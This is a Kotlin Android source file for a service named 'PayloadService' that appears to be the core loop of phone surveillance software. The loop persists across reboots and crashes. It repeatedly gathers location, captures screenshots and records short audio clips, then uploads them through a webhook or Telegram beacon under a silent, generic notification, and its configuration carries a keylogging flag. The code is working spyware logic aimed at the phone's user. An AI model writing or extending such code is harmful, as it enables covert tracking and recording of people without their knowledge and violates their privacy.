package com.mobilesvc.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import kotlin.concurrent.thread

/**
 * The loop.
 *
 * A foreground service is the only mechanism Android honours for a sub-minute cadence. Doze
 * still defers network once the device has been idle, so the effective interval stretches at
 * night — the collector reports a fix timestamp, and a gap in timestamps is the honest record of
 * that, not an inference that the device stopped moving.
 *
 * `START_STICKY` plus the boot receiver is the whole persistence story. On a non-rooted device
 * there is nothing else, and uninstalling removes all of it.
 */
class PayloadService : Service() {

    companion object {
        private const val CHANNEL = "svc"
        private const val NOTIFICATION_ID = 1107
        private const val TAG = "OversightPayload"
        private const val EXTRA_FROM_BOOT = "from_boot"

        /**
         * @param fromBoot true when the start came from [BootReceiver]. Android 15 refuses a
         *   `dataSync`-typed foreground service started from `BOOT_COMPLETED`, so the boot path
         *   declares location alone — see [startForegroundCompat].
         */
        fun start(context: Context, fromBoot: Boolean = false) {
            val intent = Intent(context, PayloadService::class.java)
                .putExtra(EXTRA_FROM_BOOT, fromBoot)
            context.startForegroundService(intent)
        }
    }

    private lateinit var config: PayloadConfig
    private lateinit var locator: RadioLocator
    private lateinit var collector: Collector
    private lateinit var beacon: Beacon
    private lateinit var capturer: ScreenCapturer
    private var running = false

    /**
     * True once the service has declared the `mediaProjection` foreground type.
     *
     * Sticky because the type has to survive a re-issued `startForeground`: `onStartCommand`
     * runs again on every restart, and declaring `location|dataSync` alone would downgrade the
     * service while a live projection is still attached.
     */
    private var projectionDeclared = false

    /** Result of the previous screenshot attempt, carried into the next report line. */
    private var lastShot: String? = null

    override fun onCreate() {
        super.onCreate()
        config = PayloadConfig.load(this)
        locator = RadioLocator(this)
        collector = Collector(this, config)
        beacon = Beacon(config)
        capturer = ScreenCapturer(this)
        createChannel()
        android.util.Log.i(
            TAG,
            "service up: screen=${config.screen} keylog=${config.keylog} consent=${ScreenConsent.has()}"
        )
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!config.foregroundService) {
            // Without a notification there is no legal sub-minute cadence; degrade to a single
            // cycle and stop rather than pretending to poll.
            thread { cycle() }
            stopSelf()
            return START_NOT_STICKY
        }

        // A sticky restart after a crash arrives while the app is backgrounded, and the platform
        // refuses startForeground in that state with ForegroundServiceStartNotAllowedException.
        // There is no retry that fixes it — the next legal window is the next time the app is in
        // the foreground — so the honest response is to stop cleanly and let the boot receiver
        // try again on the next boot instead of crash-looping.
        val fromBoot = intent?.getBooleanExtra(EXTRA_FROM_BOOT, false) == true
        Diag.log(this, "onStartCommand fromBoot=$fromBoot")
        if (!startForegroundCompat(fromBoot = fromBoot)) {
            Diag.log(this, "startForeground refused (fromBoot=$fromBoot)")
            stopSelf()
            return START_NOT_STICKY
        }
        Diag.log(this, "foreground ok")

        if (!running) {
            running = true
            thread(name = "agent-loop") { loop() }
        }
        return START_STICKY
    }

    private fun startForegroundCompat(
        includeProjection: Boolean = false,
        fromBoot: Boolean = false
    ): Boolean {
        val notification = buildNotification("Running")
        return runCatching {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 15 refuses a foreground service started from BOOT_COMPLETED if it asks
                // for dataSync (along with camera, mediaPlayback, phoneCall, mediaProjection and
                // microphone). Location is still permitted, so the boot path asks for location
                // alone and the loop survives the reboot.
                var types = if (fromBoot) {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                } else {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                }
                if ((includeProjection || projectionDeclared) &&
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE
                ) {
                    // Must be declared before the consent token is exchanged, not after — see
                    // ScreenCapturer.attach.
                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                }
                startForeground(NOTIFICATION_ID, notification, types)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
            true
        }.getOrElse { error ->
            android.util.Log.e(
                TAG,
                "startForeground(projection=$includeProjection boot=$fromBoot) failed",
                error
            )
            runCatching { startForeground(NOTIFICATION_ID, notification) }.isSuccess
        }
    }

    private fun loop() {
        val wakeLock = (getSystemService(Context.POWER_SERVICE) as? PowerManager)
            ?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "agent:loop")
        while (running) {
            runCatching {
                wakeLock?.acquire(30_000L)
                cycle()
            }
            runCatching { wakeLock?.release() }
            val sleep = config.cadenceSec * 1000L
            try {
                Thread.sleep(sleep)
            } catch (_: InterruptedException) {
                running = false
            }
        }
    }

    private fun cycle() {
        if (!collector.uploadAllowed()) return

        val screenNote = ensureProjection().let { base ->
            lastShot?.let { "$base; last shot $it" } ?: base
        }
        val report = runCatching { collector.collect(locator, screenNote) }.getOrElse { return }
        val ok = beacon.send(report)
        updateNotification(if (ok) "Reported ${System.currentTimeMillis()}" else "Send failed")

        if (config.screen && capturer.attached) {
            captureAndShip()
        }

        if (config.audio) {
            collector.purgeAudio()
            val clip = runCatching { collector.recordAudio(10) }.getOrNull()
            if (clip != null) {
                runCatching {
                    val bytes = clip.readBytes()
                    beacon.sendDocument(clip.name, "audio/mp4", bytes, "audio clip")
                }
                clip.delete()
            }
        }
    }

    /**
     * Makes sure a projection session exists, and reports why it does not when it does not.
     *
     * The order is load-bearing on API 34+: the `mediaProjection` foreground type has to be
     * declared before the consent token is exchanged, and the token is single-use. So a failed
     * attach clears the parked consent rather than retrying it — a retry would throw.
     */
    private fun ensureProjection(): String {
        if (!config.screen) return "not requested"
        if (capturer.attached) return "attached"

        val consent = ScreenConsent.take()
            ?: return "NO CONSENT (open the app once to grant screen capture)"

        // The service declares the foreground type first, then attach() exchanges the token.
        val ok = runCatching {
            capturer.attach(consent.first, consent.second) {
                projectionDeclared = true
                startForegroundCompat()
            }
        }.getOrDefault(false)

        if (!ok) {
            ScreenConsent.clear()
            return "CONSENT REJECTED (grant again from the app)"
        }
        return "attached"
    }

    private fun captureAndShip() {
        ScreenCapturer.purge(this)
        val shot = runCatching { capturer.grab() }.getOrNull()
        if (shot == null) {
            lastShot = "no frame"
            android.util.Log.w(TAG, "grab produced no frame")
            return
        }
        val bytes = runCatching { shot.readBytes() }.getOrNull()
        shot.delete()
        if (bytes == null || bytes.isEmpty()) {
            lastShot = "unreadable"
            android.util.Log.e(TAG, "captured file could not be read")
            return
        }
        // Logged because a webhook transport carries text only: the report line is the only
        // evidence the frame existed, and the Telegram document upload is the only way to see it.
        lastShot = "${bytes.size / 1024} kB"
        android.util.Log.i(TAG, "captured ${bytes.size} bytes (${shot.name})")
        runCatching { beacon.sendDocument(shot.name, "image/jpeg", bytes, "screen") }
    }

    private fun buildNotification(text: String): Notification {
        val open = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        return Notification.Builder(this, CHANNEL)
            .setContentTitle(config.label)
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setContentIntent(open)
            .build()
    }

    private fun updateNotification(text: String) {
        val manager = getSystemService(NotificationManager::class.java) ?: return
        runCatching { manager.notify(NOTIFICATION_ID, buildNotification(text)) }
    }

    private fun createChannel() {
        val manager = getSystemService(NotificationManager::class.java) ?: return
        if (manager.getNotificationChannel(CHANNEL) != null) return
        manager.createNotificationChannel(
            NotificationChannel(CHANNEL, "Service", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
            }
        )
    }

    override fun onDestroy() {
        running = false
        runCatching { capturer.release() }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
